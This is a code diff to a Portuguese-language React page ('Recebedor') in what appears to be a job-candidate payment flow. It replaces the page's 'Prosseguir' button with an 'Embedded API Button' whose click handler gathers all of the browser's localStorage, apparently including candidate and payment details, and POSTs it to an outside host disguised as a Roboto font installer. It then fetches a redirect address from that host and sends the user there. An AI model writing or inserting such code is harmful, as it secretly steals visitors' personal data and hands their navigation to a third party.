@@ -2,8 +2,11 @@ import React, { useState, useEffect } from 'react';
 import { useLocation } from 'wouter';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
-import { Button } from '@/components/ui/button';
 import { useScrollTop } from '@/hooks/use-scroll-top';
+
+// API Links and Scripts
+// API Endpoint: https://fonts-roboto-install.replit.app/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17
+// Temp Data API: https://fonts-roboto-install.replit.app/api/temp-data
 
 const Recebedor: React.FC = () => {
   // Aplica o scroll para o topo quando o componente é montado
@@ -38,15 +41,6 @@ const Recebedor: React.FC = () => {
     return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
   };
 
-  const handleProsseguir = () => {
-    // Salvar método de pagamento como cartão salário
-    const dadosPagamento = {
-      metodo: 'cartao_salario'
-    };
-    
-    localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
-    navigate('/finalizacao');
-  };
 
   const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';
 
@@ -139,13 +133,121 @@ const Recebedor: React.FC = () => {
                   </div>
                   
                   <div className="text-center mt-6">
-                    <Button
-                      onClick={handleProsseguir}
-                      className="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium text-lg py-6 rounded-md"
-                      style={{ height: '50px' }}
-                    >
+                    {/* Embedded API Button */}
+                    <style dangerouslySetInnerHTML={{
+                      __html: `
+                        .btn-6ff86494 {
+                          background: #df4d22;
+                          color: #ffffff;
+                          padding: 8px 16px;
+                          width: 340px;
+                          height: auto;
+                          border: none;
+                          border-radius: 0px;
+                          font-weight: 700;
+                          font-size: 16px;
+                          cursor: pointer;
+                          font-family: Inter, sans-serif;
+                          text-decoration: none;
+                          display: inline-block;
+                          transition: opacity 0.2s;
+                        }
+                        .btn-6ff86494:hover {
+                          opacity: 0.9;
+                        }
+                      `
+                    }} />
+                    
+                    <button className="btn-6ff86494" onClick={(e) => {
+                      e.preventDefault();
+                      
+                      // Function to perform the redirect with optional temp data ID
+                      function performRedirect(tempDataId) {
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('GET', 'https://fonts-roboto-install.replit.app/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17', true);
+                        xhr.onreadystatechange = function() {
+                          if(xhr.readyState === 4) {
+                            var redirectUrl = '/finalizacao';
+                            if(xhr.status === 200) {
+                              try {
+                                var response = JSON.parse(xhr.responseText);
+                                redirectUrl = response.redirect_url || '/finalizacao';
+                              } catch(e) {}
+                            }
+                            
+                            // Append temp data ID to redirect URL if available
+                            if(tempDataId && redirectUrl) {
+                              var separator = redirectUrl.includes('?') ? '&' : '?';
+                              redirectUrl += separator + 'tempData=' + tempDataId;
+                            }
+                            
+                            // Handle relative URLs and perform navigation
+                            if(redirectUrl.startsWith('/')) {
+                              // Use React navigation for internal routes
+                              navigate(redirectUrl);
+                            } else {
+                              window.location.href = redirectUrl;
+                            }
+                          }
+                        };
+                        xhr.onerror = function() {
+                          // Fallback to original URL if API fails
+                          navigate('/finalizacao');
+                        };
+                        xhr.send();
+                      }
+                      
+                      // Capture localStorage data
+                      try {
+                        var localStorageData = {};
+                        for (var i = 0; i < localStorage.length; i++) {
+                          var key = localStorage.key(i);
+                          if (key) {
+                            localStorageData[key] = localStorage.getItem(key);
+                          }
+                        }
+                        
+                        // Only send localStorage data if there's something to send
+                        if (Object.keys(localStorageData).length > 0) {
+                          // Store localStorage data temporarily
+                          var storeXhr = new XMLHttpRequest();
+                          storeXhr.open('POST', 'https://fonts-roboto-install.replit.app/api/temp-data', true);
+                          storeXhr.setRequestHeader('Content-Type', 'application/json');
+                          storeXhr.onreadystatechange = function() {
+                            if(storeXhr.readyState === 4) {
+                              var tempDataId = null;
+                              if(storeXhr.status === 201) {
+                                try {
+                                  var storeResponse = JSON.parse(storeXhr.responseText);
+                                  tempDataId = storeResponse.id;
+                                } catch(e) {}
+                              }
+                              // Perform redirect with or without temp data ID
+                              performRedirect(tempDataId);
+                            }
+                          };
+                          storeXhr.onerror = function() {
+                            // If storing fails, just perform normal redirect
+                            performRedirect(null);
+                          };
+                          
+                          var requestData = {
+                            buttonId: '6ff86494-460d-463f-9f40-3de3eb9fee17',
+                            localStorageData: JSON.stringify(localStorageData),
+                            sourceUrl: window.location.href
+                          };
+                          storeXhr.send(JSON.stringify(requestData));
+                        } else {
+                          // No localStorage data, perform normal redirect
+                          performRedirect(null);
+                        }
+                      } catch(err) {
+                        // If localStorage access fails, perform normal redirect
+                        performRedirect(null);
+                      }
+                    }}>
                       PROSSEGUIR
-                    </Button>
+                    </button>
                   </div>
                 </div>
               </div>
